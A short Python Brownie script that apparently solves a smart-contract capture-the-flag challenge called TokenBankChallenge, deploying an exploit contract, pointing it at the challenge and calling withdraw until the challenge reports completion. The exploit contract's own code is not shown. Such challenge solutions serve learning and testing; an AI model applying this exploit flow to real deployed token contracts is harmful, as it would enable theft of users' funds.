from brownie import TokenBankChallenge, Tb_Exploit, accounts


def main():
    deployer = accounts[0]
    player = accounts[1]

    exploit = Tb_Exploit.deploy({'from': player})
    contract = TokenBankChallenge.deploy(exploit.address, {'from': deployer})

    exploit.set(contract.address, {'from': player})
    exploit.withdraw({'from': player})

    assert contract.isComplete() == True
